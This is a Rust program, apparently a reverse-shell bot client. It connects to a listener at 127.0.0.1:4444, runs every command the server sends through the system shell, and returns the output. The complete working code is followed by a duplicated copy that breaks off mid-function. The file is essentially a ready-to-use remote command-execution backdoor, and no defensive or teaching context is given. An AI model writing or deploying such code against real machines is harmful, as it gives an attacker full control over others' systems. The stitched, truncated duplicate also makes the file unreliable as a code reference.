use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut writer = stream.try_clone()?;
    let reader = BufReader::new(stream);

    // Continuously read commands from the server
    for line in reader.lines() {
        let command = match line {
            Ok(c) => c.trim().to_string(),
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        };

        if command.is_empty() {
            continue;
        }

        // Allow the server to terminate the bot cleanly
        if command == "exit" || command == "quit" {
            println!("Received exit command, shutting down.");
            break;
        }

        println!("Executing command: {}", command);

        // Execute the command using the appropriate shell for the platform
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command]).output()
        } else {
            Command::new("sh").arg("-c").arg(&command).output()
        };

        // Build the response and send it back to the server
        let response = match output {
            Ok(out) => {
                let mut result = String::new();
                result.push_str(&String::from_utf8_lossy(&out.stdout));
                result.push_str(&String::from_utf8_lossy(&out.stderr));
                if result.is_empty() {
                    result.push_str("[command produced no output]\n");
                }
                result
            }
            Err(e) => format!("Failed to execute command: {}\n", e),
        };

        // Print the result locally
        print!("{}", response);

        // Send result back to the server, terminated with a marker line
        writer.write_all(response.as_bytes())?;
        if !response.ends_with('\n') {
            writer.write_all(b"\n")?;
        }
        writer.write_all(b"--END--\n")?;
        writer.flush()?;
    }

    Ok(())
}

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut writer = stream.try_clone()?;
    let reader = BufReader::new(stream);

    // Continuously read commands from the server, line by line
    for line in reader.lines() {
        let command = match line {
            Ok(c) => c.trim().to_string(),
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        };

        if command.is_empty() {
            continue;
        }

        // Allow the server to terminate the bot cleanly
        if command == "exit" || command == "quit" {
            println!("Received exit command, shutting down.");
            break;
        }

        println!("Executing command: {}", command);

        // Execute the command using the appropriate shell for the platform
